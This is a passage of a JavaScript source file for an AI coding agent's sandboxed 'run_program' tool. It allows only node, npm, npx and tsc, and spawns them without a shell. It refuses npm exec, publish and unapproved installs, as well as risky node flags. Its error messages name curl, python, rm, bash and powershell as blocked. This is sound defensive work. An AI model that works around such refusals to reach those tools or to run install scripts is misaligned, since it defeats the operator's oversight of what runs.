   * ⚠️ AN INSTALL IS NEVER A BACKGROUND PROCESS, EVEN WHEN INSTALLS ARE ON.
   * `start_process` starts something nobody waits for. An install nobody waits
   * for races the very `node`/`npm test` run that needs what it is fetching, and
   * its receipt — the package.json line a human is supposed to review — is read
   * by no one. So this refusal has no switch, and it names the way out.
   */
  if (INSTALL_SUBCOMMANDS.has(sub)) {
    return { ok: false, error: `npm ${sub} cannot be started in the background — nothing would wait for it, so the next command would race a half-populated node_modules, and this runner never installs or publishes without being waited on. Run it with run_program instead.` };
  }
  if (REFUSED_NPM_SUBCOMMANDS.has(sub)) {
    return { ok: false, error: `npm ${sub} is refused — this runner never installs or publishes. Only "test", "run <script>" and "run <script> -- <args…>" are available.` };
  }
  if (sub === 'test' || sub === 't') {
    if (args.length !== 1) {
      return { ok: false, error: 'npm test takes no extra arguments. To pass arguments to a script use args: ["run", "<script>", "--", …].' };
    }
    return { ok: true, script: 'test', extra: [] };
  }
  if (sub === 'run' || sub === 'run-script') {
    const script = args[1];
    if (typeof script !== 'string' || !/^[A-Za-z0-9][A-Za-z0-9:._-]*$/.test(script)) {
      return { ok: false, error: `"${script ?? '(nothing)'}" is not a valid npm script name — args must be ["run", "<script>"] or ["run", "<script>", "--", …]` };
    }
    if (args.length > 2 && args[2] !== '--') {
      return { ok: false, error: 'to pass arguments to a script, separate them with "--": args: ["run", "build", "--", "--out", "dist"]' };
    }
    return { ok: true, script, extra: args.length > 2 ? args.slice(3) : [] };
  }
  return {
    ok: false,
    error: `npm ${sub ?? '(nothing)'} is refused — only "test", "run <script>" and "run <script> -- <args…>" are available here. This runner never installs or publishes.`,
  };
}

/**
 * ── ⭐ PLAN ONE PROCESS, FOR A CALLER THAT WILL NOT WAIT FOR IT ──────────────
 *
 * Everything `run_program` checks, and nothing it runs. `background.mjs` calls
 * this so `start_process` can finally take a real argv — `node server.mjs
 * --port 3005`, the most common dev-server invocation on earth, which the string
 * parser refuses because `--port` is not one of NODE's flags (measured: it is,
 * and always was, refused).
 *
 * ⚠️ npm IS PLANNED, NOT SPAWNED — the same trick `runPackageScript` uses and for
 * a sharper reason here. Handing extra arguments to `npm run dev -- --port 3005`
 * means npm appends them to the script BODY and hands the result to a shell; the
 * quoting of that append is npm's business, not ours, and "probably quoted" is
 * not a security argument. So the script body is validated and its program is
 * spawned directly with a real argv, exactly as `run_program` does.
 *
 * ⚠️ A `pre`/`post` HOOK IS A REFUSAL RATHER THAN A SKIP. `runPackageScript`
 * runs them in npm's order and stops at the first failure — impossible for a
 * single background process, which by definition nobody waits for. Silently
 * dropping a `predev` that builds the thing being served would make the server
 * serve something stale, so it says so and names the way out.
 *
 * @param {{ root: string, program: unknown, args?: unknown }} input
 * @returns {{ ok: true, cwd: string, program: string, script?: string, argv: string[], file: string, spawnArgs: string[] } | ArgvRefused}
 */
export function planSingleSpawn({ root, program, args } = {}) {
  const rr = realRootOf(root);
  if (!rr.ok) return { ok: false, error: rr.error };
  const cwd = rr.root;

  if (typeof program !== 'string' || !program) {
    return { ok: false, error: `program is required and must be one of: ${ALLOWED_BINARIES.join(', ')}` };
  }
  if (!ALLOWED_BINARIES.includes(program)) {
    return {
      ok: false,
      error: `"${program}" is not a program this agent may run. Allowed: ${ALLOWED_BINARIES.join(', ')}. git has its own structured tools (git_status, git_diff, git_commit); curl, python, rm, bash, sh, cmd and powershell are not reachable from here at all.`,
    };
  }

  const list = checkArgList(args);
  if (!list.ok) return list;

  if (program === 'npm') {
    const parsed = parseNpmArgs(list.args);
    if (!parsed.ok) return parsed;
    const read = readPackageJson(cwd);
    if (!read.ok) return read;
    const scripts = read.pkg && typeof read.pkg === 'object' ? read.pkg.scripts : null;
    if (!scripts || typeof scripts !== 'object') {
      return { ok: false, error: 'package.json has no "scripts" section, so there is nothing to run. Run the file directly: program "node", args ["path/to/file.mjs"].' };
    }
    if (typeof scripts[parsed.script] !== 'string') {
      const available = Object.keys(scripts).slice(0, 12);
      return { ok: false, error: `package.json has no "${parsed.script}" script${available.length ? ` (it has: ${available.join(', ')})` : ''}` };
    }
    for (const hook of [`pre${parsed.script}`, `post${parsed.script}`]) {
      if (typeof scripts[hook] !== 'string') continue;
      return {
        ok: false,
        error: `the "${parsed.script}" script has a "${hook}" hook, and only ONE process can be started in the background — nothing would wait for the hook, so it would either be skipped or race the thing it exists to prepare. Run it first with run_program {"program":"npm","args":["run","${hook}"]}, then start "${parsed.script}".`,
      };
    }
    const step = planScriptStep(cwd, parsed.script, scripts[parsed.script], parsed.extra);
    if (!step.ok) return step;
    return {
      ok: true,
      cwd,
      program,
      script: parsed.script,
      argv: parsed.extra.length ? ['npm', 'run', parsed.script, '--', ...parsed.extra] : ['npm', 'run', parsed.script],
      ranArgv: step.argv,
      file: step.file,
      spawnArgs: step.spawnArgs,
    };
  }

  const plan = planBinaryInvocation(cwd, program, list.args);
  if (!plan.ok) return plan;
  return { ok: true, cwd, program, argv: plan.argv, file: plan.file, spawnArgs: plan.spawnArgs };
}

/**
 * ── ⭐ THE TOOL ─────────────────────────────────────────────────────────────
 *
 * @param {{ root: string, program: unknown, args?: unknown, timeoutMs?: number, spawnImpl?: Function }} input
 */
export async function runProgram({ root, program, args, timeoutMs, spawnImpl } = {}) {
  const rr = realRootOf(root);
  if (!rr.ok) return { ok: false, error: rr.error };
  const cwd = rr.root;

  if (typeof program !== 'string' || !program) {
    return { ok: false, error: `program is required and must be one of: ${ALLOWED_BINARIES.join(', ')}` };
  }
  if (!ALLOWED_BINARIES.includes(program)) {
    return {
      ok: false,
      error: `"${program}" is not a program this agent may run. Allowed: ${ALLOWED_BINARIES.join(', ')}. git has its own structured tools (git_status, git_diff, git_commit); curl, python, rm, bash, sh, cmd and powershell are not reachable from here at all.`,
    };
  }

  const list = checkArgList(args);
  if (!list.ok) return list;

  /**
   * ⚠️ npm KEEPS ITS OWN, MULTI-STEP PATH HERE. `planSingleSpawn` plans exactly
   * one process and refuses a `pre`/`post` hook; `run_program` waits for what it
   * starts, so it can and must run the hooks in npm's order.
   */
  if (program === 'npm') return runNpm({ root: cwd, args: list.args, timeoutMs, spawnImpl });

  const planned = planBinaryInvocation(cwd, program, list.args);
  if (!planned.ok) return planned;
  const inv = { file: planned.file, args: planned.spawnArgs };

  const run = await spawnPlanned({ file: inv.file, spawnArgs: inv.args, cwd, timeoutMs: boundTimeout(timeoutMs), spawnImpl });
  if (!run.ok) return run;

  return {
    ok: true,
    program,
    /**
     * ⚠️ TWO ARGVS, ON PURPOSE. `argv` is the logical one — it is the receipt
     * that proves `"buy milk"` arrived as ONE slot, which is the fact the model
     * (and the transcript) needs. `spawnArgv` is literally what hit the OS,
     * including the resolved npx/tsc entry point, because "what really ran" and
     * "what I asked for" differ for three of the four programs.
     */
    argv: planned.argv,
    spawnArgv: [inv.file, ...inv.args],
    exitCode: run.exitCode,
    signal: run.signal,
    timedOut: run.timedOut,
    stdout: run.stdout,
    stderr: run.stderr,
    truncated: run.truncated,
    durationMs: run.durationMs,
    // `ok` means it RAN. Whether it passed is a separate fact, and conflating
    // the two is how a loop reports success on a failing test.
    passed: run.exitCode === 0 && !run.timedOut,
  };
}

/** `npm` never actually gets spawned — see runPackageScript for why. EXCEPT for
 *  an install, which is the one npm subcommand npm itself has to perform. */
async function runNpm({ root, args, timeoutMs, spawnImpl, env = process.env }) {
  const sub = args[0];
  if (INSTALL_SUBCOMMANDS.has(sub)) return runNpmInstall({ root, args, timeoutMs, spawnImpl, env });
  if (REFUSED_NPM_SUBCOMMANDS.has(sub)) {
    return { ok: false, error: `npm ${sub} is refused — this runner never installs or publishes. Only "test", "run <script>" and "run <script> -- <args…>" are available.` };
  }
  if (sub === 'test' || sub === 't') {
    if (args.length !== 1) {
      return { ok: false, error: 'npm test takes no extra arguments. To pass arguments to a script use args: ["run", "<script>", "--", …].' };
    }
    return runPackageScript({ root, script: 'test', timeoutMs, spawnImpl });
  }
  if (sub === 'run' || sub === 'run-script') {
    const script = args[1];
    if (typeof script !== 'string' || !/^[A-Za-z0-9][A-Za-z0-9:._-]*$/.test(script)) {
      return { ok: false, error: `"${script ?? '(nothing)'}" is not a valid npm script name — args must be ["run", "<script>"] or ["run", "<script>", "--", …]` };
    }
    let extra = [];
    if (args.length > 2) {
      if (args[2] !== '--') {
        return { ok: false, error: 'to pass arguments to a script, separate them with "--": args: ["run", "build", "--", "--watchless"]' };
      }
      extra = args.slice(3);
    }
    return runPackageScript({ root, script, extraArgs: extra, timeoutMs, spawnImpl });
  }
  return {
    ok: false,
    error: `npm ${sub ?? '(nothing)'} is refused — only "test", "run <script>" and "run <script> -- <args…>" are available here. This runner never installs or publishes.`,
  };
}

/**
 * ── ⭐ RUN AN npm SCRIPT WITHOUT npm, AND WITHOUT A SHELL ───────────────────
 *
 * npm runs a script body by handing it to a shell. That is exactly the thing
 * this package refuses to do, and on Windows it is also broken for our purposes:
 * `cmd.exe` does not expand globs at all, so `node --test test/*.test.mjs` under
 * npm on Windows runs ZERO tests and exits 0.
 *
 * ⭐ So the body is validated, its globs are expanded HERE, and its program is
 * spawned directly with a real argv. Which means the most common test
 * convention in Node finally works, and a suite that matches nothing fails
 * loudly instead of passing vacuously.
 *
 * ⚠️ `pre<script>` and `post<script>` are run too, in npm's order, stopping at
 * the first failure. They are not skipped, because a `pretest` that builds the
 * thing under test is load-bearing, and silently omitting it would make a green
 * run mean something different from what the user believes it means.
 *
 * @param {{ root: string, script: unknown, extraArgs?: string[], timeoutMs?: number, spawnImpl?: Function }} input
 */
export async function runPackageScript({ root, script, extraArgs = [], timeoutMs, spawnImpl } = {}) {
  const rr = realRootOf(root);
  if (!rr.ok) return { ok: false, error: rr.error };
  const cwd = rr.root;

  if (typeof script !== 'string' || !script) return { ok: false, error: 'script is required — the name of an npm script, e.g. "test"' };
  const extra = checkArgList(extraArgs);
  if (!extra.ok) return extra;

  const read = readPackageJson(cwd);
  if (!read.ok) return read;
  const scripts = read.pkg && typeof read.pkg === 'object' ? read.pkg.scripts : null;
  if (!scripts || typeof scripts !== 'object') {
    return { ok: false, error: 'package.json has no "scripts" section, so there is nothing to run. Run the file directly: program "node", args ["path/to/file.mjs"].' };
  }
  if (typeof scripts[script] !== 'string') {
    const available = Object.keys(scripts).slice(0, 12);
    return { ok: false, error: `package.json has no "${script}" script${available.length ? ` (it has: ${available.join(', ')})` : ''}` };
  }

  const plan = [];
  for (const name of [`pre${script}`, script, `post${script}`]) {
    if (typeof scripts[name] !== 'string') continue;
    const step = planScriptStep(cwd, name, scripts[name], name === script ? extra.args : []);
    // ⚠️ EVERY step is validated BEFORE ANY step runs. Validating lazily would
    // let `pretest` execute and then refuse `posttest`, leaving the workspace
    // half-way through an operation nobody chose.
    if (!step.ok) return step;
    plan.push(step);
  }

  const bounded = boundTimeout(timeoutMs);
  const steps = [];
  let chosen = null;
  let total = 0;
  for (const step of plan) {
    const run = await spawnPlanned({ file: step.file, spawnArgs: step.spawnArgs, cwd, timeoutMs: bounded, spawnImpl });
    if (!run.ok) return run;
    total += run.durationMs;
    steps.push({ name: step.name, argv: step.argv, exitCode: run.exitCode, timedOut: run.timedOut, durationMs: run.durationMs });
    // The result the model reads is the FIRST FAILURE if there is one, because
    // that is the output that explains the exit code; otherwise the named
    // script's own, because pre/post output is scaffolding.
    if (chosen === null && (run.exitCode !== 0 || run.timedOut)) chosen = { step, run };
    if (run.exitCode !== 0 || run.timedOut) break;
    if (step.name === script) chosen = { step, run };
  }
  if (!chosen) return { ok: false, error: `the "${script}" script produced no runnable step — this is a bug in acuvo-code` };

  const { step, run } = chosen;
  return {
    ok: true,
    program: 'npm',
    script,
    argv: extra.args.length ? ['npm', 'run', script, '--', ...extra.args] : ['npm', 'run', script],
    /** ⭐ What the script BODY actually became, which is the line that proves a
     *  glob expanded to real files rather than being handed over literally. */
    ranArgv: step.argv,
    spawnArgv: [step.file, ...step.spawnArgs],
    steps,
    exitCode: run.exitCode,
    signal: run.signal,
    timedOut: run.timedOut,
    stdout: run.stdout,
    stderr: run.stderr,
    truncated: run.truncated,
    durationMs: total,
    passed: run.exitCode === 0 && !run.timedOut,
  };
}

/**
 * Render for the MODEL. Leads with the argv, because the argv is the fact the
 * old string runner could never show: it is how the model confirms its quoted
 * argument survived as one token.
 */
export function formatProgramRunForModel(result) {
  if (!result.ok) return `run_program refused: ${result.error}`;
  const lines = [`$ ${JSON.stringify(result.argv)}`];
  if (result.ranArgv) lines.push(`  script body ran as: ${JSON.stringify(result.ranArgv)}`);
  if (Array.isArray(result.installed)) {
    /** ⭐ Same receipt `run_command` prints, and for the same reason: without the
     *  `--ignore-scripts` line, a package whose postinstall fetches its binary
     *  installs "successfully" and then fails at require time with an error that
     *  looks like a bug in the agent's own code. */
    for (const item of result.installed) {
      lines.push(item.range
        ? `  recorded in package.json: "${item.name}": "${item.range}" (${item.section})`
        : `  ⚠️ "${item.name}" is NOT in package.json after this install — nothing was recorded`);
    }
    lines.push('  (--ignore-scripts was forced: no lifecycle script from any package ran. A package that builds a native addon or downloads a binary at install time will need a human to install it.)');
  }
  if (result.timedOut) {
    lines.push(`TIMED OUT after ${Math.round(result.durationMs / 1000)}s and was killed. It produced no exit code.`);
  } else {
    lines.push(`exit code: ${result.exitCode} (${(result.durationMs / 1000).toFixed(1)}s)${result.passed ? ' — PASSED' : ' — FAILED'}`);
  }
  if (result.stdout?.trim()) lines.push('--- stdout ---', result.stdout.trimEnd());
  if (result.stderr?.trim()) lines.push('--- stderr ---', result.stderr.trimEnd());
  if (!result.stdout?.trim() && !result.stderr?.trim()) lines.push('(no output)');
  return lines.join('\n');
}

export function spawnArgvToolSchemas() {
  return [
    {
      type: 'function',
      function: {
        name: 'run_program',
        description: [
          'Run a program with a REAL argument array — this is the tool to use whenever an argument',
          'contains a space, a quote, or a leading dash. There is no shell and no string parsing:',
          'each item of `args` becomes exactly one argv slot, so "buy milk" stays one argument and',
          '--all, --pri, -- and > are passed to your program as plain data.',
          'node: flags BEFORE the script path are checked (--eval, --require, --import, --env-file,',
          '--inspect and --watch are refused); everything AFTER the script path is passed through',
          'untouched. npm: test, run <script>, and run <script> -- <args…>; exec and publish are always',
          `refused. npm install/ci works ONLY if the operator set ${ALLOW_INSTALL_ENV}=1 — when it is off the`,
          'refusal says so, and telling the user that variable is the way to unblock a missing dependency.',
          'When it is on: registry package names only (no URL, git, file: or npm: alias), at most four per',
          'call, --ignore-scripts is forced (so a package that builds a native addon will need a human),',
          'and the new package.json line is reported back to you.',
          'npx: only vitest and tsc, already installed. A glob (* or ?) in a node test',
          'target or an npm script body is expanded against the workspace, and a glob matching ZERO',
          'files is an error rather than a run that exits 0 having tested nothing.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            program: {
              type: 'string',
              enum: ALLOWED_BINARIES,
              description: 'One of node, npm, npx, tsc. Nothing else is reachable.',
            },
            args: {
              type: 'array',
              items: { type: 'string' },
              description: 'One argument per array item, e.g. ["bin/todo.js", "add", "buy milk"] or ["--test", "test/*.test.mjs"] or ["run", "build", "--", "--out", "dist"]. Never put two arguments in one string.',
            },
            timeoutMs: {
              type: 'number',
              description: `Milliseconds before the child is killed. Default ${DEFAULT_COMMAND_TIMEOUT_MS}, max ${MAX_COMMAND_TIMEOUT_MS}.`,
            },
          },
          required: ['program', 'args'],
        },
      },
    },
  ];
}
